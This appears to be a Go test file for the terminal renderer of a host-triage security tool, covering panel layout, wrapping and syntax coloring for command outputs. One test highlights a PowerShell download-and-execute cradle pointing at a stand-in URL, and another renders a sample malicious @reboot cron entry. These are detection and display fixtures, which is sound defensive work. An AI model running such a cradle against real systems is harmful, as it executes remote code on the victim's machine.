package render

import (
	"bytes"
	"os"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/charmbracelet/lipgloss"
	"github.com/muesli/termenv"

	"karma/internal/model"
)

var ansi = regexp.MustCompile(`\x1b\[[0-9;]*m`)

func plain(s string) string { return ansi.ReplaceAllString(s, "") }

// The test process's stdout is not a terminal, so lipgloss lands in the Ascii
// profile and comparing plain text would verify no coloring at all; pinning the
// 256-color profile makes this package's color assertions real.
func TestMain(m *testing.M) {
	lipgloss.SetColorProfile(termenv.ANSI256)
	os.Exit(m.Run())
}

// A check panel is a half-block left rail: the severity color for signals,
// muted otherwise, the id as the level-two band label and metadata right on
// the first line, and over-long lines soft-wrapped — not one word lost,
// continuation lines sharing the body indent, the rail unbroken. The per-line
// width assertions below also cover the CJK case: a title row carrying a CJK
// badge once shifted the border and collapsed the line width on a real Windows
// host (Server 2025, 146 columns).
func TestCheckPanelSignalRail(t *testing.T) {
	const width = 48
	long := strings.Repeat("allow from 203.0.113.0/24 ", 8)
	result := &model.CheckResult{
		Check:   &model.Check{ID: "listen", Aspect: model.AspectNetwork},
		Outcome: model.Collected,
		Document: model.Document{
			Filtered: []model.FilterCount{{ID: "drop", Count: 3}},
			Sections: []model.Section{{Lines: []model.Line{
				{
					Text: "tcp 0.0.0.0:22", Severity: model.High,
					Matches: []model.Match{{ID: "open", Severity: model.High, Message: "external listener", Start: 0, End: 3}},
				},
				{Text: long, Severity: model.Info},
			}}},
		},
	}
	got := checkPanel(result, 40, width)
	lines := strings.Split(got, "\n")
	if len(lines) < 3 {
		t.Fatalf("panel too short: %q", plain(got))
	}
	head := plain(lines[0])
	if !strings.HasPrefix(head, "▌ ") {
		t.Fatalf("a signal panel should start with the half-block rail: %q", head)
	}
	if !strings.Contains(head, "LISTEN") {
		t.Fatalf("the first line should carry the check id: %q", head)
	}
	if !strings.Contains(head, "filtered 3") || strings.Index(head, "LISTEN") > strings.Index(head, "filtered 3") {
		t.Fatalf("metadata should be on the right: %q", head)
	}
	for i, line := range lines {
		if !strings.HasPrefix(plain(line), "▌") {
			t.Fatalf("line %d should carry the rail: %q", i, plain(line))
		}
		if got := lipgloss.Width(line); got > width-1 {
			t.Fatalf("line %d is %d wide, past the right-edge slack: %q", i, got, plain(line))
		}
	}
	if !strings.Contains(got, "⟨external listener⟩") {
		t.Fatalf("a finding row should carry the trailing reason: %q", plain(got))
	}
	// Soft wrap preserves everything: every word of the long line is present,
	// broken across several lines
	body := plain(strings.Join(lines[2:], "\n"))
	for _, word := range []string{"allow", "203.0.113.0/24"} {
		if !strings.Contains(body, word) {
			t.Fatalf("wrapping must not lose content (missing %q): %q", word, body)
		}
	}
	if strings.Count(body, "203.0.113.0/24") != 8 {
		t.Fatalf("all 8 addresses of the long line should survive: %q", body)
	}
	if len(lines)-2 < 4 {
		t.Fatalf("an over-long line should wrap onto several lines, got %d: %q", len(lines)-2, body)
	}
}

// Execution notes such as timeout/failure: with no body they still produce a
// thin grey rail panel, with the red note on the right of the first line.
func TestCheckPanelNoteBlock(t *testing.T) {
	result := &model.CheckResult{
		Check:   &model.Check{ID: "dmesg", Aspect: model.AspectKernel},
		Outcome: model.Failed,
		Note:    "timeout (30s), partial output kept",
		Raw:     "line one\nline two\n",
	}
	got := checkPanel(result, 400, 80)
	if got == "" {
		t.Fatal("a check with a note must not stay silent")
	}
	lines := strings.Split(got, "\n")
	if !strings.HasPrefix(plain(lines[0]), "▌ DMESG") || !strings.Contains(plain(lines[0]), "timeout (30s), partial output kept") {
		t.Fatalf("the first line should carry the id and the note: %q", plain(lines[0]))
	}
	noteStyle := style{fg: "9", bold: true, bg: subBandColor}
	if !strings.Contains(lines[0], noteStyle.seq().Render("timeout (30s), partial output kept")) {
		t.Fatalf("the note should be lit on the band: %q", lines[0])
	}
	if body := plain(strings.Join(lines[1:], "\n")); !strings.Contains(body, "line one") ||
		!strings.Contains(body, "line two") {
		t.Fatalf("a note panel should carry the raw text: %q", body)
	}
}

// A quiet check gets the grey rail; a check that was never collected and one
// collected with no content alike do not appear in the report.
func TestCheckPanelQuietRailAndSkippedLine(t *testing.T) {
	quiet := &model.CheckResult{
		Check:   &model.Check{ID: "passwd", Aspect: model.AspectIdentity},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{
			{Lines: []model.Line{{Text: "root:x:0:0:root:/root:/bin/bash", Severity: model.Info}}},
		}},
	}
	lines := strings.Split(checkPanel(quiet, 40, 80), "\n")
	quietRail := mutedStyle.seq().Render("▌")
	for i, line := range lines {
		if !strings.HasPrefix(plain(line), "▌ ") {
			t.Fatalf("a quiet panel should start with the grey rail (line %d): %q", i, plain(line))
		}
		if !strings.HasPrefix(line, quietRail) {
			t.Fatalf("the quiet panel's rail should be muted (line %d): %q", i, line)
		}
	}
	if head := plain(lines[0]); !strings.HasPrefix(head, "▌ PASSWD") {
		t.Fatalf("the first line should start with the id: %q", head)
	}

	skipped := &model.CheckResult{
		Check:         &model.Check{ID: "last-log", Aspect: model.AspectIdentity},
		Outcome:       model.Skipped,
		SkippedLabels: []string{"last", "lastlog"},
	}
	if got := checkPanel(skipped, 40, 80); got != "" {
		t.Fatalf("a check that was never collected should stay silent: %q", plain(got))
	}
	empty := &model.CheckResult{
		Check:    &model.Check{ID: "empty", Aspect: model.AspectIdentity},
		Outcome:  model.Collected,
		Document: model.Document{Sections: []model.Section{{}}},
	}
	if got := checkPanel(empty, 40, 80); got != "" {
		t.Fatalf("a check collected with no content should stay silent: %q", plain(got))
	}
}

// The level-one heading band fills the line width, is all uppercase, white on
// dark, and never exceeds the terminal.
func TestHeadingBand(t *testing.T) {
	const width = 60
	band := headingBand("identity", width)
	if got := lipgloss.Width(band); got != width-1 {
		t.Fatalf("the banner should fill %d columns, got %d", width-1, got)
	}
	if text := plain(band); !strings.HasPrefix(text, " IDENTITY") {
		t.Fatalf("the banner should be uppercase: %q", text)
	}
	if !strings.Contains(band, "\x1b[") {
		t.Fatalf("the banner should be colored: %q", band)
	}
	if narrow := headingBand("identity", 12); lipgloss.Width(narrow) != 11 {
		t.Fatalf("a narrow terminal should still be filled: %d", lipgloss.Width(narrow))
	}
}

// The check title is the heading tree's second step (the listing's aspect
// band): the band fills the panel from the rail to the right edge as one
// solid strip, the label is the uppercase id, and body rows carry no band.
func TestCheckPanelHeadIsASubBand(t *testing.T) {
	const width = 60
	result := &model.CheckResult{
		Check:   &model.Check{ID: "listen", Aspect: model.AspectNetwork},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{{Lines: []model.Line{
			{Text: "tcp 0.0.0.0:22", Severity: model.Info},
		}}}},
	}
	panel := checkPanel(result, 40, width)
	lines := strings.Split(panel, "\n")
	head := lines[0]
	if got := lipgloss.Width(head); got != railInner(width)+1 {
		t.Fatalf("the head band should fill rail + inner width (%d), got %d", railInner(width)+1, got)
	}
	if !strings.Contains(head, "48;5;238") {
		t.Fatalf("the head should sit on the level-two band: %q", head)
	}
	bandPaintedSpaces := regexp.MustCompile(`\x1b\[[0-9;]*48;5;238[0-9;]*m {2,}`)
	if !bandPaintedSpaces.MatchString(head) {
		t.Fatalf("the band's padding should be painted (solid strip): %q", head)
	}
	if label := plain(head); !strings.Contains(label, " LISTEN") {
		t.Fatalf("the band label should be the uppercase id: %q", label)
	}
	for i, line := range lines[1:] {
		if strings.Contains(line, "48;5;238") {
			t.Fatalf("body line %d should carry no band: %q", i+1, plain(line))
		}
	}

	// Metadata that does not fit beside the label drops to its own band row,
	// aligned with the label, both rows filled edge to edge.
	long := result
	long.Document.Truncated = true
	long.Document.Filtered = []model.FilterCount{{ID: "quiet", Count: 12}}
	long.Check.ID = "last-log"
	narrow := checkPanel(long, 40, 20)
	narrowLines := strings.Split(narrow, "\n")
	if plain(narrowLines[0]) == plain(narrowLines[1]) {
		t.Fatalf("the metadata should sit on its own band row:\n%s", plain(narrow))
	}
	for i := 0; i < 2; i++ {
		if got := lipgloss.Width(narrowLines[i]); got != railInner(20)+1 {
			t.Fatalf("narrow band row %d should still fill the panel: %d", i, got)
		}
	}
}

// A body row carrying a token lipgloss cannot break (a base64 argument with no
// separator) must not widen the panel past the line: the row is broken by
// character, and no part of the token is dropped.
func TestCheckPanelBoundsUnbreakableTokens(t *testing.T) {
	blob := strings.Repeat("QUJD", 40) // 160 cells, no break point
	result := &model.CheckResult{
		Check:   &model.Check{ID: "ps", Aspect: model.AspectProcess},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{{Lines: []model.Line{
			{Text: "501 1 0 0 Tue09AM ?? 0:00 x " + blob, Severity: model.Info},
		}}}},
	}
	panel := checkPanel(result, 40, 100)
	for index, line := range strings.Split(panel, "\n") {
		if got := lipgloss.Width(line); got > lineWidth(100) {
			t.Fatalf("line %d is %d cells wide: %q", index, got, plain(line))
		}
	}
	if !strings.Contains(plain(panel), "QUJDQUJD") {
		t.Fatal("the token should be broken across lines, not dropped")
	}
}

func TestTableAndKeyvalStylersStayInsideTheLine(t *testing.T) {
	table := newTableStyler(nil, true)
	lines := []string{
		"USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT",
		"root     pts/0    1.2.3.4          21:17    0.00s  0.01s  0.00s w",
	}
	if spans := table.style(lines[0]); spans != nil {
		t.Fatalf("an all-caps header only records column anchors: %v", spans)
	}
	spans := table.style(lines[1])
	if len(spans) == 0 {
		t.Fatal("a data row should get column colors")
	}
	for _, span := range spans {
		if span.Start < 0 || span.End > len(lines[1]) || span.Start >= span.End {
			t.Fatalf("span out of range: %+v line length %d", span, len(lines[1]))
		}
	}

	banner := "21:31:02 up 95 days, 12:16,  3 users,  load average: 1.33, 0.61, 0.28"
	bannerSpans := table.style(banner)
	if len(bannerSpans) != 1 || bannerSpans[0].Start != 0 || bannerSpans[0].End != len(banner) ||
		bannerSpans[0].Style != mutedStyle {
		t.Fatalf("w's uptime banner should be muted whole-line: %+v", bannerSpans)
	}
	short := " 10:20:30 up 12:16,  1 user,  load average: 0.00, 0.01, 0.05"
	if got := table.style(short); len(got) != 1 || got[0].Style != mutedStyle {
		t.Fatalf("an uptime banner under a day should also be muted whole-line: %+v", got)
	}

	route := newKeyvalStyler().style("default via 10.0.0.1 dev eth0 proto static")
	if len(route) == 0 {
		t.Fatal("a route row should get key/value colors")
	}
	for _, span := range route {
		if span.End > len("default via 10.0.0.1 dev eth0 proto static") {
			t.Fatalf("route span out of range: %+v", span)
		}
	}
}

// top -b opens with a summary block (banner, Tasks, %Cpu, MiB Mem) that is
// prose, not columns: the top styler has no cycle fallback, so it stays plain
// until the all-caps process header anchors the table.
func TestTopStylerKeepsTheSummaryPlain(t *testing.T) {
	top := buildLineStyler("top")
	preamble := []string{
		"top - 21:39:12 up 95 days,  3:12,  1 user,  load average: 0.12, 0.34, 0.56",
		"Tasks: 112 total,   1 running, 111 sleeping,   0 stopped,   0 zombie",
		"%Cpu(s):  0.7 us,  0.3 sy,  0.0 ni, 98.9 id,  0.1 wa,  0.0 hi,  0.0 si,  0.0 st",
		"MiB Mem :   7964.0 total,   1234.5 free,   2345.6 used,   4383.9 buff/cache",
		"MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   5618.4 avail Mem",
		"Mem: 12345K used, 6789K free, 0K shrd, 123K buff, 4567K cached",
		"CPU:  0.0% usr  0.0% sys  0.0% nic 99.7% idle  0.0% io  0.0% irq  0.0% sirq",
	}
	for _, line := range preamble {
		if spans := top(line); spans != nil {
			t.Fatalf("a summary line should stay plain: %q -> %v", line, spans)
		}
	}
	header := "    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND"
	if spans := top(header); spans != nil {
		t.Fatalf("the process header only records anchors: %v", spans)
	}
	row := "  1234 root      20   0  1621236 458880  10240 S   0.0  0.3   0:05.32  sshd"
	spans := top(row)
	if len(spans) == 0 {
		t.Fatal("a process row should get column colors")
	}
	if spans[0].Start != strings.Index(row, "1234") {
		t.Fatalf("the first span should color the PID cell: %+v in %q", spans[0], row)
	}
	if last := spans[len(spans)-1]; row[last.Start:last.End] != "0:05.32" {
		t.Fatalf("the last span should color the TIME+ cell: %+v in %q", last, row)
	}
	for _, span := range spans {
		if span.Start < 0 || span.End > len(row) || span.Start >= span.End {
			t.Fatalf("span out of range: %+v line length %d", span, len(row))
		}
	}
}

func TestPaintLineOverlaysLaterSpans(t *testing.T) {
	got := paintLine("0123456789", []Span{
		{Start: 0, End: 10, Style: mutedStyle},
		{Start: 2, End: 4, Style: highStyle},
	})
	if want := highStyle.seq().Render("23"); !strings.Contains(got, want) {
		t.Fatalf("a later span should cover an earlier one: %q", plain(got))
	}
	if want := mutedStyle.seq().Render("01"); !strings.Contains(got, want) {
		t.Fatalf("the leading part should keep the base color: %q", plain(got))
	}
	if want := mutedStyle.seq().Render("456789"); !strings.Contains(got, want) {
		t.Fatalf("the trailing part should return to the base color: %q", plain(got))
	}
}

func TestLsLPermissionBitsPaintedOverMutedBase(t *testing.T) {
	line := "-rw-r--r-- 1 root root 4096 Jan 01 12:34 /tmp/notes.txt"
	painted := paintLine(line, styleLsL(line))
	wBit := style{fg: "3"}.seq().Render("w")
	if !strings.Contains(painted, wBit) {
		t.Fatalf("permission bits should be lit one by one (w yellow): %q", painted)
	}
	clock := style{fg: "2"}.seq().Render("Jan 01 12:34")
	if !strings.Contains(painted, clock) {
		t.Fatalf("a date with a time should be green: %q", painted)
	}
	owners := mutedStyle.seq().Render("-- 1 root root ")
	if !strings.Contains(painted, owners) {
		t.Fatalf("owner and group should be muted: %q", painted)
	}
}

func TestLsmodKeepsUsedByTailPlain(t *testing.T) {
	styler := newLineStyler("lsmod")
	if spans := styler("Module                  Size  Used by"); spans != nil {
		t.Fatalf("the header row should not be painted: %v", spans)
	}
	row := "nvidia_uvm            1310720  2 nvidia_core nvidia"
	tail := strings.Index(row, "nvidia_core")
	spans := styler(row)
	if len(spans) == 0 {
		t.Fatal("a data row should get column colors")
	}
	for _, span := range spans {
		if span.End > tail {
			t.Fatalf("the Used by tail (which may contain spaces) should stay default: %+v row %q", span, row)
		}
	}
	for i, want := range []string{"nvidia_uvm", "1310720", "2"} {
		if !strings.Contains(paintLine(row, spans), tableColumnStyles[i].seq().Render(want)) {
			t.Fatalf("column %d should have its column color: %+v", i, spans)
		}
	}
	legacy := "nvidia 53248 2 nvidia - Live 0xffffffffa0000000"
	if tail := strings.Index(legacy, "Live"); tail > 0 {
		for _, span := range styler(legacy) {
			if span.End > tail {
				t.Fatalf("the state field of /proc/modules should stay default: %+v", span)
			}
		}
	}
}

func TestLineStylerPanicFallsBackToPlain(t *testing.T) {
	boomer := safeLineStyler(func(string) []Span { panic("odd output") })
	if spans := boomer("any line"); spans != nil {
		t.Fatalf("a panic should return no spans: %v", spans)
	}
	if spans := boomer("next line"); spans != nil {
		t.Fatalf("one blow-up should degrade to plain text permanently: %v", spans)
	}
}

func TestPanelRenderPanicFallsBackToPlainBlock(t *testing.T) {
	original := panelRenderer
	defer func() { panelRenderer = original }()
	panelRenderer = func(*model.CheckResult, int, int) string { panic("layout blew up") }
	result := &model.CheckResult{
		Check:   &model.Check{ID: "listen", Aspect: model.AspectNetwork},
		Outcome: model.Collected,
		Raw:     "tcp 0.0.0.0:22\n",
	}
	text, failed := renderPanel(result, 400, 100)
	if !failed || text == "" {
		t.Fatalf("a failed render should fall back to the grey block: failed=%v text=%q", failed, plain(text))
	}
	if !strings.Contains(plain(text), "LISTEN") || !strings.Contains(plain(text), "tcp 0.0.0.0:22") {
		t.Fatalf("the fallback block should keep the id and the raw text: %q", plain(text))
	}
}

func TestProgressDoesNotStickToPanels(t *testing.T) {
	var buf lockedBuffer
	check := &model.Check{ID: "listen", Aspect: model.AspectNetwork}
	obs := NewLiveObserver(&buf, []*model.Check{check}, 40, 48, true)
	obs.Start()
	obs.CheckStarted(check)
	time.Sleep(150 * time.Millisecond)
	if !strings.Contains(buf.String(), " 0/1 ") {
		t.Fatalf("the progress line should show 0/1 while the check runs: %q", buf.String())
	}
	obs.CheckFinished(check, &model.CheckResult{
		Check:   check,
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{{
			Lines: []model.Line{{
				Text: "tcp 0.0.0.0:22", Severity: model.High,
				Matches: []model.Match{{
					ID: "open", Severity: model.High, Message: "external listener", Start: 0, End: 3,
				}},
			}},
		}}},
	})
	time.Sleep(150 * time.Millisecond)
	if !strings.Contains(buf.String(), " 1/1 ") {
		t.Fatalf("the progress line should count the finished check (a channel address would print here): %q", buf.String())
	}
	obs.Close()

	visible := strings.Join(screen(buf.String()), "\n")
	if !strings.Contains(visible, "LISTEN") || !strings.Contains(visible, "▌") {
		t.Fatalf("the check panel should remain:\n%s", visible)
	}
	for _, line := range strings.Split(visible, "\n") {
		if strings.Contains(line, "▌") && strings.Contains(line, "1/1") {
			t.Fatalf("the progress count stuck to the rail: %q", line)
		}
		for _, frame := range spinnerFrames {
			if strings.Contains(line, frame) {
				t.Fatalf("a progress glyph stayed on screen: %q\n%s", line, visible)
			}
		}
	}
}

// lockedBuffer is a bytes.Buffer the test may read while the observer loop
// writes: the loop goroutine owns the writes, and String takes the same lock.
type lockedBuffer struct {
	mu  sync.Mutex
	buf bytes.Buffer
}

func (b *lockedBuffer) Write(p []byte) (int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.buf.Write(p)
}

func (b *lockedBuffer) String() string {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.buf.String()
}

// screen replays terminal semantics: \r returns to column 0, CSI K clears to
// end of line, newline commits.
func screen(raw string) []string {
	var lines []string
	var cur []rune
	col := 0
	for i := 0; i < len(raw); {
		switch {
		case raw[i] == '\n':
			lines = append(lines, string(cur))
			cur, col = nil, 0
			i++
		case raw[i] == '\r':
			col = 0
			i++
		case strings.HasPrefix(raw[i:], "\033[K"):
			if col < len(cur) {
				cur = cur[:col]
			}
			i += len("\033[K")
		case raw[i] == '\033':
			i++
			for i < len(raw) && (raw[i] < 0x40 || raw[i] > 0x7e) {
				i++
			}
			if i < len(raw) {
				i++
			}
		default:
			r, size := utf8.DecodeRuneInString(raw[i:])
			if col < len(cur) {
				cur[col] = r
			} else {
				cur = append(cur, r)
			}
			col++
			i += size
		}
	}
	if len(cur) > 0 {
		lines = append(lines, string(cur))
	}
	return lines
}

func TestSeverityBorderHue(t *testing.T) {
	if severityBorder(model.Critical) != "1" || severityBorder(model.High) != "9" {
		t.Fatalf("border hues: critical %q high %q", severityBorder(model.Critical), severityBorder(model.High))
	}
	if severityBorder(model.Medium) != "11" || severityBorder(model.Low) != "14" {
		t.Fatalf("border hues: medium %q low %q", severityBorder(model.Medium), severityBorder(model.Low))
	}
}

// Source titles are bold plain text (default color) and hits carry a trailing
// reason; sources are separated by one blank line.
func TestBodyRowsSourceBlocks(t *testing.T) {
	result := &model.CheckResult{
		Check:   &model.Check{ID: "cron", Aspect: model.AspectPersistence},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{
			{
				Title:        "/etc/cron.d/evil",
				TitleMatches: []model.Match{{ID: "cron-reboot", Severity: model.High, Message: "reboot trigger", Start: 5, End: 10}},
				Lines: []model.Line{{
					Text: "@reboot cmd", Severity: model.High,
					Matches: []model.Match{{ID: "cron-reboot", Severity: model.High, Message: "reboot trigger", Start: 0, End: 7}},
				}},
			},
			{
				Title: "/etc/crontab",
				Lines: []model.Line{{Text: "daily job", Severity: model.Info}},
			},
		}},
	}
	rows := bodyRows(result, 400, 100)
	if got := plain(rows[0]); got != "/etc/cron.d/evil  ⟨reboot trigger⟩" {
		t.Fatalf("the source title should come before the body, with the trailing reason: %q", got)
	}
	if !strings.Contains(rows[0], style{bold: true}.seq().Render("/etc/")) {
		t.Fatalf("the source title should be bold plain text: %q", rows[0])
	}
	if strings.Contains(rows[0], mutedStyle.seq().Render("/etc/")) {
		t.Fatalf("the source title should no longer be muted: %q", rows[0])
	}
	if got := plain(rows[1]); got != "@reboot cmd  ⟨reboot trigger⟩" {
		t.Fatalf("below the source title comes the body row with its reason: %q", got)
	}
	if rows[2] != "" {
		t.Fatalf("sources should be separated by one blank line: %q", plain(rows[2]))
	}
	if plain(rows[3]) != "/etc/crontab" {
		t.Fatalf("a quiet source title is plain: %q", plain(rows[3]))
	}
}

// The preamble (output before any source header) comes first, separated from
// the source title by one blank line.
func TestBodyRowsPreludeComesFirst(t *testing.T) {
	result := &model.CheckResult{
		Check:   &model.Check{ID: "mixed", Aspect: model.AspectIdentity},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{
			{Lines: []model.Line{{Text: "raw prelude", Severity: model.Info}}},
			{Title: "/etc/passwd", Lines: []model.Line{{Text: "root:x:0:0:", Severity: model.Info}}},
		}},
	}
	rows := bodyRows(result, 400, 100)
	if plain(rows[0]) != "raw prelude" {
		t.Fatalf("the preamble should come first: %q", plain(rows[0]))
	}
	if rows[1] != "" || plain(rows[2]) != "/etc/passwd" {
		t.Fatalf("the preamble and the source should be separated by one blank line: %q", plain(strings.Join(rows, "|")))
	}
}

// A failed render falls back to a thin grey rail with the raw text, keeping the
// id and the text.
func TestFallbackPanelKeepsRawText(t *testing.T) {
	result := &model.CheckResult{
		Check:   &model.Check{ID: "listen", Aspect: model.AspectNetwork},
		Outcome: model.Collected,
		Raw:     "tcp 0.0.0.0:22\n",
	}
	text := fallbackPanel(result, 400, 100)
	for _, line := range strings.Split(text, "\n") {
		if !strings.HasPrefix(plain(line), "▌") {
			t.Fatalf("the fallback block should be a grey rail: %q", plain(line))
		}
	}
	if joined := plain(text); !strings.Contains(joined, "LISTEN") || !strings.Contains(joined, "tcp 0.0.0.0:22") {
		t.Fatalf("the fallback block should keep the id and the raw text: %q", joined)
	}
}

func TestRegStyler(t *testing.T) {
	styler := newLineStyler("reg")
	key := `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths`
	if spans := styler(key); len(spans) != 1 || spans[0].Start != 0 || spans[0].End != len(key) {
		t.Fatalf("the key path should be painted whole-line: %+v", spans)
	}
	row := `    url1    REG_SZ    \\Mac\Home\Docs`
	spans := styler(row)
	for _, want := range []struct {
		text   string
		Styler style
	}{
		{"url1", style{fg: "4"}},
		{"REG_SZ", keywordColor},
	} {
		if !strings.Contains(paintLine(row, spans), want.Styler.seq().Render(want.text)) {
			t.Fatalf("the value row should light up %q: %q", want.text, plain(paintLine(row, spans)))
		}
	}
	hexRow := `    0    REG_BINARY    0C,00,00,00`
	if spans := styler(hexRow); !strings.Contains(paintLine(hexRow, spans), dimStyle.seq().Render("0C,00,00,00")) {
		t.Fatalf("hex data should be dimmed: %q", plain(paintLine(hexRow, styler(hexRow))))
	}
	cont := `        00,00,00,00`
	if spans := styler(cont); len(spans) != 1 || spans[0].Style != dimStyle {
		t.Fatalf("a wrapped continuation should be dimmed whole-line: %+v", spans)
	}
}

func TestUSBStyler(t *testing.T) {
	styler := newLineStyler("pipe")
	row := `win2k25-0 SSD | 3&4b87e29&0&000000 | Installed 2025-01-02 03:04:05 | Last Connected 2025-06-07 08:09:10`
	spans := styler(row)
	if len(spans) == 0 {
		t.Fatal("a usb row should be painted")
	}
	painted := paintLine(row, spans)
	if !strings.Contains(painted, style{fg: "4"}.seq().Render("win2k25-0 SSD")) {
		t.Fatalf("the device name should be blue: %q", plain(painted))
	}
	if !strings.Contains(painted, style{fg: "2"}.seq().Render("2025-01-02 03:04:05")) {
		t.Fatalf("a timestamp should be green: %q", plain(painted))
	}
	if !strings.Contains(painted, mutedStyle.seq().Render("Last Connected")) {
		t.Fatalf("a label should be muted: %q", plain(painted))
	}
	bare := `MacBook Pro Camera | 6&3b8d32a8&0&0000`
	if spans := styler(bare); len(spans) == 0 {
		t.Fatal("a row without a timestamp should also be painted")
	}
}

func TestNetstatStyler(t *testing.T) {
	styler := newLineStyler("netstat")
	header := `  Proto  Local Address          Foreign Address        State           PID`
	if spans := styler(header); spans != nil {
		t.Fatalf("a header row only records column anchors: %v", spans)
	}
	row := `  TCP    10.0.0.5:52134         1.2.3.4:443           ESTABLISHED     4321`
	spans := styler(row)
	if len(spans) == 0 {
		t.Fatal("a data row should get column colors")
	}
	for _, span := range spans {
		if span.Start < 0 || span.End > len(row) || span.Start >= span.End {
			t.Fatalf("span out of range: %+v line length %d", span, len(row))
		}
	}
}

func TestPowershellStyler(t *testing.T) {
	styler := newLineStyler("powershell")
	line := `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x/y.ps1')`
	spans := styler(line)
	if len(spans) == 0 {
		t.Fatal("a PowerShell command line should be painted")
	}
	painted := paintLine(line, spans)
	if !strings.Contains(painted, keywordColor.seq().Render("Invoke-Expression")) {
		t.Fatalf("a cmdlet should get the keyword color: %q", plain(painted))
	}
	if !strings.Contains(painted, stringColor.seq().Render(`'http://x/y.ps1'`)) {
		t.Fatalf("a URL string should be blue: %q", plain(painted))
	}
	for _, span := range spans {
		if span.Start < 0 || span.End > len(line) || span.Start >= span.End {
			t.Fatalf("span out of range: %+v line length %d", span, len(line))
		}
	}
}

// The unit table's ACTIVE and SUB cells are repainted by meaning once the
// header anchors the columns: alive (active/running) green, finished
// (exited/inactive) faint. A state word inside DESCRIPTION keeps the plain
// table color.
func TestUnitStateCellsPaintedByMeaning(t *testing.T) {
	pad := func(text string, width int) string { return text + strings.Repeat(" ", width-len(text)) }
	header := pad("UNIT", 16) + pad("LOAD", 7) + pad("ACTIVE", 9) + pad("SUB", 11) + "DESCRIPTION"
	styler := newLineStyler("units")
	if spans := styler(header); spans != nil {
		t.Fatalf("the header should only record anchors: %v", spans)
	}
	hasSpan := func(spans []Span, line, word string, want style) bool {
		start := strings.Index(line, word)
		for _, span := range spans {
			if span.Start == start && span.End == start+len(word) && span.Style == want {
				return true
			}
		}
		return false
	}
	covered := func(spans []Span, start, end int) bool {
		for _, span := range spans {
			if span.Start <= start && span.End >= end {
				return true
			}
		}
		return false
	}

	running := pad("nginx.service", 16) + pad("loaded", 7) + pad("active", 9) + pad("running", 11) +
		"A high performance web server"
	spans := styler(running)
	if !hasSpan(spans, running, "active", style{fg: "2"}) ||
		!hasSpan(spans, running, "running", style{fg: "2"}) {
		t.Fatalf("active/running should be painted green: %+v", spans)
	}
	exited := pad("certbot.service", 16) + pad("loaded", 7) + pad("active", 9) + pad("exited", 11) +
		"Certbot renewal"
	spans = styler(exited)
	if !hasSpan(spans, exited, "active", style{fg: "2"}) || !hasSpan(spans, exited, "exited", dimStyle) {
		t.Fatalf("active should stay green and exited should go faint: %+v", spans)
	}
	desc := pad("sshd.service", 16) + pad("loaded", 7) + pad("active", 9) + pad("running", 11) +
		"daemon that keeps users running"
	spans = styler(desc)
	at := strings.LastIndex(desc, "running")
	if covered(spans, at, at+len("running")) {
		t.Fatalf("a state word inside DESCRIPTION should stay default: %+v", spans)
	}
}

// A section override styles that section with its own rule; the rest keep the
// check syntax. Glob titles let dynamic per-file sections match too.
func TestSectionSyntaxOverridesByTitle(t *testing.T) {
	check := &model.Check{
		ID: "skel", Syntax: "bash",
		SectionSyntax: []model.SectionSyntax{
			{Title: "/etc/skel", Syntax: "ls-l"},
			{Title: "/home/*/.*_history", Syntax: "colon"},
		},
	}
	if got := sectionSyntax(check, "/etc/skel"); got != "ls-l" {
		t.Fatalf("the listing section should take the override: %q", got)
	}
	if got := sectionSyntax(check, "/etc/skel/.bashrc"); got != "bash" {
		t.Fatalf("other sections keep the check syntax: %q", got)
	}
	if got := sectionSyntax(check, "/home/deploy/.zsh_history"); got != "colon" {
		t.Fatalf("a glob should match dynamic titles: %q", got)
	}
	if got := sectionSyntax(&model.Check{Syntax: "bash"}, "/etc/skel"); got != "bash" {
		t.Fatalf("no overrides means the check syntax everywhere: %q", got)
	}
}

// End to end through the panel: a services document rendered under the units
// syntax paints the state cells by meaning.
func TestUnitsPanelPaintsStateCells(t *testing.T) {
	result := &model.CheckResult{
		Check:   &model.Check{ID: "services", Aspect: model.AspectService, Syntax: "units"},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{{Lines: []model.Line{
			{Text: "UNIT             LOAD   ACTIVE   SUB        DESCRIPTION", Severity: model.Info},
			{Text: "sshd.service     loaded active   running    OpenBSD server", Severity: model.Info},
			{Text: "certbot.service  loaded active   exited     Certbot renewal", Severity: model.Info},
		}}}},
	}
	panel := checkPanel(result, 40, 120)
	if !strings.Contains(panel, style{fg: "2"}.seq().Render("running")) {
		t.Fatalf("running should be green in the panel:\n%s", plain(panel))
	}
	if !strings.Contains(panel, dimStyle.seq().Render("exited")) {
		t.Fatalf("exited should be faint in the panel:\n%s", plain(panel))
	}
}

// End to end through the panel: one panel, two section rules — the skel
// listing keeps the ls -l colors while the collected shell file keeps the
// bash lexer.
func TestSkelPanelKeepsLsColorsForTheListing(t *testing.T) {
	result := &model.CheckResult{
		Check: &model.Check{
			ID: "skel", Aspect: model.AspectPersistence, Syntax: "bash",
			SectionSyntax: []model.SectionSyntax{{Title: "/etc/skel", Syntax: "ls-l"}},
		},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{
			{Title: "/etc/skel", Lines: []model.Line{
				{Text: "-rw-r--r-- 1 root root 921 Jan 01 12:34 /etc/skel/.bashrc", Severity: model.Info},
			}},
			{Title: "/etc/skel/.bashrc", Lines: []model.Line{
				{Text: "export EDITOR=vim", Severity: model.Info},
			}},
		}},
	}
	panel := checkPanel(result, 40, 120)
	if !strings.Contains(panel, style{fg: "2"}.seq().Render("Jan 01 12:34")) {
		t.Fatalf("the listing should keep the ls -l colors:\n%s", plain(panel))
	}
	if !strings.Contains(panel, keywordColor.seq().Render("export")) {
		t.Fatalf("the shell section should keep the bash lexer:\n%s", plain(panel))
	}
}

